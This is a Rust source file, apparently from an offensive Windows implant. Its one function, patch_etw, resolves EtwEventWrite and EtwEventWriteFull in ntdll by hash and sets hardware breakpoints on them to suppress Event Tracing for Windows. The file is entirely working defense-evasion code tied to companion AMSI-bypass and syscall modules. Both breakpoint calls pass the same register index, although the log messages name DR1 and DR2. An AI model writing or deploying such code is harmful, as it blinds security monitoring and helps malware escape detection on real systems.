use crate::core::{amsi, hashes, resolver, ssn_table};
use crate::debug;

pub unsafe fn patch_etw() -> bool { unsafe {
    let table = ssn_table::syscall_table();
    let ntdll = table.modules.ntdll;
    if ntdll.is_null() {
        return false;
    }

    let mut patched = 0u32;

    let etw_write = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITE_HASH);
    if !etw_write.is_null() {
        if amsi::set_hardware_breakpint(2, etw_write as usize) {
            debug!("[ETW] DR1 -> EtwEventWrite @ {:p}", etw_write);
            patched += 1;
        }
    }

    let etw_write_full = resolver::ldr_function_by_hash(ntdll, hashes::ETWEVENTWRITEFULL_HASH);
    if !etw_write_full.is_null() {
        if amsi::set_hardware_breakpint(2, etw_write_full as usize) {
            debug!("[ETW] DR2 -> EtwEventWriteFull @ {:p}", etw_write_full);
            patched += 1;
        }
    }

    debug!("[ETW] Hardware breakpints set: {}/2",  patched);
    patched > 0
}}